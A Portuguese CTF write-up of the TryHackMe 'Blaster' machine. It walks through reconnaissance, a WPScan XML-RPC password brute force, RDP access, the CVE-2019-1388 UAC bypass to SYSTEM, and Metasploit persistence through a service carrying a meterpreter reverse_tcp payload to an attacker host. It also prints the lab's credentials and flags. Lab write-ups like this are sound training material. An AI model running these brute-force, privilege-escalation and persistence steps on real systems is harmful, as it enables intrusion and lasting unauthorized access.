# 🕹️ Blaster — CTF Writeup
### TryHackMe | Boot-to-Root | WordPress XML-RPC Brute Force · RDP Access · CVE-2019-1388 UAC Bypass

---

| **Analista**          | Mauricio Robert                                                                        |
|-----------------------|----------------------------------------------------------------------------------------|
| **Organização**       | Faculdade Impacta                                                                      |
| **Data do Relatório** | 10/08/2026                                                                             |
| **Data do Pentest**   | 10/08/2026 · 21:39 – 22:24 (GMT+0000) / 19:06 – 19:24 (host RDP)                       |
| **Alvo**              | `10.67.182.140` — TryHackMe · Blaster                                                  |
| **Classificação**     | CONFIDENCIAL                                                                           |
| **Ferramentas**       | Nmap 7.99 · Gobuster 3.8.2 · CeWL 6.2.1 · WPScan · FreeRDP (xfreerdp) · CVE-2019-1388 (hhupd.exe) · Metasploit Framework (persistence_suggester / persistence-service) |
| **Plataforma**        | TryHackMe — Boot-to-Root                                                               |

---

## 🔍 Resumo Executivo

Este relatório documenta o comprometimento completo da máquina **Blaster** (TryHackMe), um host **Windows Server 2016** (hostname `RetroWeb`, domínio `RETROWEB`), com temática *Ready Player One*. A cadeia de ataque envolveu: reconhecimento de rede via **Nmap**, identificando IIS 10.0 (porta 80) e RDP (porta 3389); enumeração de diretórios web com **Gobuster**, revelando um blog WordPress em `/retro/` ("Retro Fanatics"); geração de uma wordlist customizada com **CeWL** a partir do conteúdo do próprio blog; ataque de força bruta via XML-RPC com **WPScan**, obtendo as credenciais válidas do autor do blog (`wade`); acesso remoto via **RDP** com essas credenciais, capturando a primeira flag no Desktop do usuário `wade`; escalada de privilégios local para `NT AUTHORITY\SYSTEM` através da vulnerabilidade **CVE-2019-1388** (bypass de UAC via o diálogo de certificado do Windows, abusando do instalador assinado `hhupd.exe`); captura da flag de root no Desktop do `Administrator`; e, por fim, estabelecimento de **persistência** no host via módulos do Metasploit (`persistence_suggester` + `exploit/windows/persistence/service`).

---

## 🛠 Ferramentas Utilizadas

| Ferramenta                     | Versão  | Finalidade                                                                             |
|---------------------------------|---------|-----------------------------------------------------------------------------------------|
| **Nmap**                        | 7.99    | Varredura de portas, fingerprint de serviços e scripts NSE (`-sV -sC`, `rdp-enum-encryption`, `rdp-ntlm-info`) |
| **Gobuster**                    | 3.8.2   | Enumeração de diretórios web (wordlist `directory-list-2.3-medium.txt`, 100 threads)     |
| **CeWL**                        | 6.2.1   | Geração de wordlist customizada a partir do conteúdo do blog WordPress                  |
| **WPScan**                      | -       | Enumeração de versão/tema/plugins do WordPress e ataque de força bruta via XML-RPC       |
| **FreeRDP (xfreerdp)**          | -       | Conexão RDP autenticada como usuário `wade`                                             |
| **CVE-2019-1388 (hhupd.exe)**   | -       | Bypass de UAC via diálogo "Certificate Information" do Windows para obtenção de shell SYSTEM |
| **Metasploit Framework**        | -       | `post/multi/recon/persistence_suggester` e `exploit/windows/persistence/service` (persistência) |

---

## 📋 Fases de Comprometimento

### FASE 1 — Reconhecimento: Varredura Nmap

> **21:39 – 21:43 GMT · Nmap 7.99**

```bash
sudo nmap -Pn -sV -sC -T5 10.67.182.140
```

```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=RetroWeb
| rdp-ntlm-info:
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Duas portas expostas: **80/tcp** (IIS 10.0, página padrão) e **3389/tcp** (RDP, host `RetroWeb`, Windows Server 2016 build 14393). Um scan direcionado confirmou os detalhes de criptografia RDP:

```bash
nmap -Pn -p3389 --script rdp-enum-encryption,rdp-ntlm-info 10.67.182.140
```

```
| rdp-enum-encryption:
|   Security layer
|     CredSSP (NLA): SUCCESS
|     CredSSP with Early User Auth: SUCCESS
|     RDSTLS: SUCCESS
|_    SSL: SUCCESS
|_  RDP Protocol Version:  RDP 10.2 server
```

```bash
curl -i http://10.67.182.140/
```

```
HTTP/1.1 200 OK
Server: Microsoft-IIS/10.0
<title>IIS Windows Server</title>
```

![Nmap](/CTFs/Blaster/images/Nmap_Scan.png)

A página raiz retornava apenas a página padrão do IIS — a investigação seguiu para a enumeração de diretórios.

---

### FASE 2 — Enumeração Web: Gobuster

> **21:49 GMT**

```bash
gobuster dir -u http://10.67.182.140/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
```

```
retro                 (Status: 301) [Size: 150] [→ http://10.67.182.140/retro/]
```

![Gobuster](/CTFs/Blaster/images/Gobuster_Scan.png)

O diretório **`/retro/`** foi identificado, redirecionando para uma instalação WordPress.

---

### FASE 3 — Reconhecimento do Site: Blog "Retro Fanatics"

Ao acessar `http://10.67.182.140/retro/`, um blog WordPress temático de 90s ("**Retro Fanatics** — Retro Games, Books, and Movies Lovers") foi identificado, com posts assinados pelo usuário **Wade**, entre eles:

- **"Tron Arcade Cabinet"** — by Wade
- **"Ready Player One"** — by Wade *("...because my name is so similar to the main character... Wade. I keep mistyping the name of his avatar whenever I log in...")*
- **"Hello world!"** — by Wade

![Website](/CTFs/Blaster/images/Website_Retro.png)

O post "Ready Player One" indicava fortemente que o nome de usuário **`wade`** era válido e sugeria uma possível confusão entre o nome do usuário e o "avatar" (nome de personagem) usado como senha — uma referência direta ao personagem *Parzival*, avatar de Wade Watts no livro/filme.

---

### FASE 4 — Wordlist Customizada e Força Bruta: CeWL + WPScan

> **21:5x GMT**

Uma wordlist customizada foi gerada a partir do próprio conteúdo do blog com o **CeWL**:

```bash
cewl -d 3 -m 5 http://10.67.182.140/retro/ -w retro.txt
wc -l retro.txt
```

```
596 retro.txt
```

![Cewl](/CTFs/Blaster/images/Brute_Force_in_Wordpress_Wordlist.png)

Com a wordlist gerada e o usuário `wade` já confirmado pela autoria dos posts, o **WPScan** foi utilizado para enumerar a instalação e realizar um ataque de força bruta contra o endpoint **XML-RPC**:

```bash
wpscan --url http://10.67.182.140/retro/ -U wade -P retro.txt
```

```
[+] Headers
    | - Server: Microsoft-IIS/10.0
    | - X-Powered-By: PHP/7.1.29

[+] XML-RPC seems to be enabled: http://10.67.182.140/retro/xmlrpc.php

[+] WordPress version 5.2.1 identified (Insecure, released on 2019-05-21)

[+] WordPress theme in use: 90s-retro
    | Version: 1.4.10 (80% confidence)
    | Author: Organic Themes

[+] Enumerating All Plugins (via Passive Methods)
[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - wade / parzival

[!] Valid Combinations Found:
| Username: wade, Password: parzival

[+] Finished: Mon Aug 10 22:02:25 2026
[+] Requests Done: 463
[+] Elapsed time: 00:02:27
```

![User and Pass](/CTFs/Blaster/images/User_Pass.png)
> 🚩 **Credencial obtida via WPScan (XML-RPC brute force): `wade : parzival`**

---

### FASE 5 — Acesso Inicial: RDP como wade (1º Flag)

> **~19:06 (relógio do host de destino)**

Com as credenciais válidas em mãos, uma conexão RDP foi estabelecida diretamente na porta **3389**:

```bash
xfreerdp /v:10.67.182.140:3389 /u:RETROWEB\\wade /p:parzival
```

```
Certificate details for 10.67.182.140:3389 (RDP-Server):
        Common Name: RetroWeb
        Subject:     CN = RetroWeb
        Issuer:      CN = RetroWeb
Do you trust the above certificate? (Y/T/N) Y
...
[INFO][com.freerdp.client.x11] - [xf_logon_error_info]: Logon Error Info LOGON_MSG_SESSION_CONTINUE
```

A sessão gráfica foi estabelecida com sucesso, exibindo o desktop de `RETROWEB\wade` com o ícone `user.txt` disponível. O arquivo foi aberto diretamente via Notepad:

```
user.txt - Notepad
THM{HACK_PLAYER_ONE}
```

![User Flag](/CTFs/Blaster/images/User_Flag.png)
> 🚩 **user.txt — FLAG CAPTURADA: `THM{HACK_PLAYER_ONE}`**

---

### FASE 6 — Escalada de Privilégios: CVE-2019-1388 (UAC Bypass via Certificate Dialog)

> **~19:12 – 19:18 (relógio do host de destino)**

No desktop do usuário `wade`, além do `user.txt`, havia um binário **`hhupd.exe`** (Microsoft HTML Help Control / HTML Help 1.31 Update — versão de arquivo 4.71.1015.0, assinado pela Microsoft). Esse binário assinado é o vetor clássico explorado pela **CVE-2019-1388**, referenciada e documentada no repositório:

```
github.com/nobodyatall648/CVE-2019-1388
"CVE-2019-1388 Abuse UAC Windows Certificate Dialog"
```

![CVE](/CTFs/Blaster/images/CVE.png)

A vulnerabilidade reside no diálogo **"Show information about the publisher's certificate"** exibido durante um prompt de UAC para um executável assinado por um editor legítimo, mas não confiável pelo usuário atual: ao clicar no link do certificado, o Internet Explorer é aberto **com privilégios elevados**; a partir dele, é possível utilizar a caixa de diálogo **"Save As"** para navegar pelo sistema de arquivos, abrir `cmd.exe` (ou `System32`) e obter um **prompt de comando executando como `NT AUTHORITY\SYSTEM`** — sem qualquer exploração de memória.

```
C:\Windows\System32> whoami
nt authority\system
```

![Privesc](/CTFs/Blaster/images/PrivEsc.png)
> 🚩 **Escalada de privilégios bem-sucedida via CVE-2019-1388 — shell obtida como `NT AUTHORITY\SYSTEM`**

---

### FASE 7 — Captura da Flag Final (2º Flag / Root)

> **~19:24 (relógio do host de destino)**

Com o cmd.exe rodando como SYSTEM, o Desktop do `Administrator` foi localizado e a flag final foi lida:

```
C:\Users\Administrator>where /r C:\ root.txt
C:\Users\Administrator\Desktop\root.txt

C:\Users\Administrator>whoami
nt authority\system

C:\Users\Administrator>cd Desktop

C:\Users\Administrator\Desktop>type root.txt
THM{COIN_OPERATED_EXPLOITATION}
```

![Root Flag](/CTFs/Blaster/images/Root_Flag.png)
> 🚩 **root.txt — FLAG FINAL CAPTURADA: `THM{COIN_OPERATED_EXPLOITATION}`**

---

### FASE 8 — Pós-Exploração: Persistência via Metasploit

Com uma sessão Meterpreter estabelecida no host `RETROWEB`, o módulo de reconhecimento **`persistence_suggester`** foi executado para identificar todos os vetores de persistência viáveis no alvo:

```bash
msf post(multi/recon/persistence_suggester) > run
```

```
 #   Name                                                        Potentially Vulnerable   Check Result
 -   ----                                                        -----------------------   ------------
 5   exploit/windows/persistence/registry                       Yes   The target is vulnerable. Registry writable
 7   exploit/windows/persistence/service                        Yes   The target appears to be vulnerable. Likely exploitable
 8   exploit/windows/persistence/service_for_user/lock_unlock    Yes   The target appears to be vulnerable. Target is likely exploitable
11   exploit/windows/persistence/task_scheduler                 Yes   The target appears to be vulnerable. Likely exploitable
12   exploit/windows/persistence/telemetry                      Yes   The target is vulnerable. Registry writable
13   exploit/windows/persistence/userinit_mpr_logon_script       Yes   The target is vulnerable. Registry writable
```

Dentre as opções disponíveis, o módulo **`exploit/windows/persistence/service`** foi selecionado para registrar um serviço Windows persistente vinculado a um payload `windows/meterpreter/reverse_tcp`:

```bash
msf exploit(windows/persistence/service) > set session 1
msf exploit(windows/persistence/service) > set SERVICE_NAME R3tr0
msf exploit(windows/persistence/service) > set LHOST 192.168.157.47
msf exploit(windows/persistence/service) > set LPORT 6767
msf exploit(windows/persistence/service) > exploit
```

```
[*] Exploit running as background job 2.
[*] Started reverse TCP handler on 192.168.157.47:6767
[+] The target appears to be vulnerable. Likely exploitable
[+] Payload written to C:\Windows\TEMP\heDG.exe
[*] Meterpreter-compatible Cleanup RC file: /home/nistezy/.msf4/logs/persistence/RETROWEB_20260810.4651/RETROWEB_20260810.4651.rc
```

![Post](/CTFs/Blaster/images/Persistence_Set.png)

Um serviço Windows (`R3tr0`) foi registrado no host, executando o payload `C:\Windows\TEMP\heDG.exe`, garantindo acesso persistente ao alvo mesmo após reinicialização — completando a cadeia de comprometimento.

---

## ⛓ Linha do Tempo do Comprometimento

```
[21:39-21:43 GMT] FASE 1 — RECONHECIMENTO (Nmap 7.99)
    80/tcp IIS 10.0 · 3389/tcp RDP (host RetroWeb, Windows Server 2016)
    ↓
[21:49 GMT] FASE 2 — ENUMERAÇÃO WEB (Gobuster)
    /retro/ → blog WordPress "Retro Fanatics"
    ↓
[FASE 3] RECONHECIMENTO DO SITE
    Posts assinados por "Wade" → usuário identificado, avatar/senha sugerida
    ↓
[21:5x-22:02 GMT] FASE 4 — WORDLIST + FORÇA BRUTA (CeWL + WPScan)
    retro.txt (596 palavras) → XML-RPC brute force
    Credencial: wade / parzival
    ↓
[~19:06] FASE 5 — ACESSO INICIAL (RDP)
    xfreerdp como RETROWEB\wade
    FLAG: THM{HACK_PLAYER_ONE} ✓
    ↓
[~19:12-19:18] FASE 6 — PRIVESC (CVE-2019-1388)
    hhupd.exe → UAC Certificate Dialog Bypass → cmd.exe como SYSTEM
    ↓
[~19:24] FASE 7 — FLAG FINAL (Root)
    C:\Users\Administrator\Desktop\root.txt
    FLAG: THM{COIN_OPERATED_EXPLOITATION} ✓
    ↓
[FASE 8] PÓS-EXPLORAÇÃO — PERSISTÊNCIA (Metasploit)
    persistence_suggester → exploit/windows/persistence/service
    Serviço "R3tr0" → C:\Windows\TEMP\heDG.exe
    ↓
COMPROMETIMENTO CONCLUÍDO — acesso persistente como SYSTEM
```

---

## 🗺 Mapeamento Investigativo

| Fase | Ferramenta/Técnica | Achado |
|------|--------------------|--------|
| Reconhecimento | Nmap 7.99 | IIS 10.0 (80) e RDP (3389) — host `RetroWeb`, Windows Server 2016 |
| Enumeração Web | Gobuster | `/retro/` → blog WordPress "Retro Fanatics" |
| Reconhecimento de Conteúdo | Navegação manual | Usuário `wade` identificado via autoria dos posts |
| Wordlist Customizada | CeWL | `retro.txt` — 596 palavras extraídas do site |
| Força Bruta | WPScan (XML-RPC) | Credencial: `wade / parzival` |
| Acesso Inicial | FreeRDP (xfreerdp) | Sessão RDP como `RETROWEB\wade` — Flag: `THM{HACK_PLAYER_ONE}` |
| Escalada de Privilégios | `CVE-2019-1388` (hhupd.exe) | Bypass de UAC via diálogo de certificado → shell `NT AUTHORITY\SYSTEM` |
| Flag Final | `type root.txt` | Flag: `THM{COIN_OPERATED_EXPLOITATION}` |
| Pós-Exploração | Metasploit `persistence_suggester` + `persistence/service` | Serviço `R3tr0` persistente (`heDG.exe`) |

---

## 🚨 Artefatos e Indicadores Identificados

| Tipo | Indicador | Contexto |
|------|-----------|----------|
| Alvo | `10.67.182.140` | Máquina Blaster (TryHackMe) — Windows Server 2016, hostname `RetroWeb` |
| Serviços expostos | `80/TCP` (IIS 10.0) · `3389/TCP` (RDP) | Superfície de ataque inicial |
| Diretório web | `/retro/` | Instalação WordPress 5.2.1 (Insecure) |
| Tema WordPress | `90s-retro` v1.4.10 | Organic Themes |
| Endpoint vulnerável | `/retro/xmlrpc.php` | XML-RPC habilitado — vetor de brute force |
| Usuário identificado | `wade` | Autoria dos posts do blog |
| Credencial válida | `wade : parzival` | Obtida via WPScan (XML-RPC brute force) |
| Vulnerabilidade de PrivEsc | `CVE-2019-1388` | UAC Bypass via Windows Certificate Dialog (hhupd.exe) |
| Binário abusado | `hhupd.exe` (HTML Help 1.31 Update) | Executável assinado pela Microsoft usado como isca do UAC |
| Persistência | Serviço `R3tr0` | `C:\Windows\TEMP\heDG.exe` — `exploit/windows/persistence/service` |
| Flag 1 | `THM{HACK_PLAYER_ONE}` | `C:\Users\wade\Desktop\user.txt` |
| Flag 2 (final) | `THM{COIN_OPERATED_EXPLOITATION}` | `C:\Users\Administrator\Desktop\root.txt` |
| Técnica (MITRE ATT&CK) | `T1110.003` | Brute Force: Password Spraying (XML-RPC) |
| Técnica (MITRE ATT&CK) | `T1021.001` | Remote Services: Remote Desktop Protocol |
| Técnica (MITRE ATT&CK) | `T1548.002` | Abuse Elevation Control Mechanism: Bypass User Account Control |
| Técnica (MITRE ATT&CK) | `T1543.003` | Create or Modify System Process: Windows Service (persistência) |

---

## ✅ Resumo das Flags

| # | Flag | Valor | Localização |
|---|------|-------|-------------|
| 🚩 Flag 1 (user) | `user.txt` | `THM{HACK_PLAYER_ONE}` | `C:\Users\wade\Desktop\` |
| 🚩 Flag 2 (root) | `root.txt` | `THM{COIN_OPERATED_EXPLOITATION}` | `C:\Users\Administrator\Desktop\` |

---

## 📚 Referências

- [TryHackMe — Blaster](https://tryhackme.com/room/blaster)
- [CVE-2019-1388 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2019-1388)
- [GitHub — nobodyatall648/CVE-2019-1388](https://github.com/nobodyatall648/CVE-2019-1388)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [CeWL — Custom Word List Generator](https://github.com/digininja/CeWL)
- [WPScan — WordPress Security Scanner](https://wpscan.com/)
- [Metasploit — persistence_suggester](https://docs.metasploit.com/docs/pentesting/metasploit-guide-post-exploitation.html)
- [MITRE ATT&CK T1110.003 — Password Spraying](https://attack.mitre.org/techniques/T1110/003/)
- [MITRE ATT&CK T1021.001 — Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001/)
- [MITRE ATT&CK T1548.002 — Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002/)
- [MITRE ATT&CK T1543.003 — Windows Service](https://attack.mitre.org/techniques/T1543/003/)

---